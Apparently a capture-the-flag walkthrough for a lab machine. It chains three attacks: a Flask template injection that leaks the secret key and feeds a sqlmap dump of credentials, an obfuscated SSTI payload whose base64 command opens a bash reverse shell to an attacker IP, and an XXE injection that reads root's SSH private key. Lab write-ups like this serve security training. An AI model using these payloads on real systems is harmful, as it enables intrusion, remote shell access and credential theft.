# step one
* get secret_key from ssti with user registration "{{config}}"
* use secret_key with flask_unsign in session cookie together with sqlmap to get password of chiv

+----+--------------------------------------+------------+-----------------+
| id | uuid                                 | name       | password        |
+----+--------------------------------------+------------+-----------------+
| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |

+---------+---------+-----------------------------------------------------------------------------------+---------------------+
| post_id | creator | message                                                                           | timestamp           |
+---------+---------+-----------------------------------------------------------------------------------+---------------------+
| 1       | 1       | Fix the <b>/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</b> portal! | 2020-04-24 15:02:41 |
+---------+---------+-----------------------------------------------------------------------------------+---------------------+

# step two
* use crazy ssti payload to get rev shell as shiv (support ticket)

{% with n = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo YmFzaCAtYyAgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi85MDAxICAwPiYxJyAK | base64 -d | bash")["read"]() %} a {% endwith %}

* grab chiv key and ssh in
* see locally bound 8080 and forward to attacker box (/var/www/game)

# step three

* crazy XXE in login, basically you inject into <!--xml version="HERE"?--> and into something like <username>"HERE"</username> in body
* use xxe to read /root/.ssh/id_rsa key and login
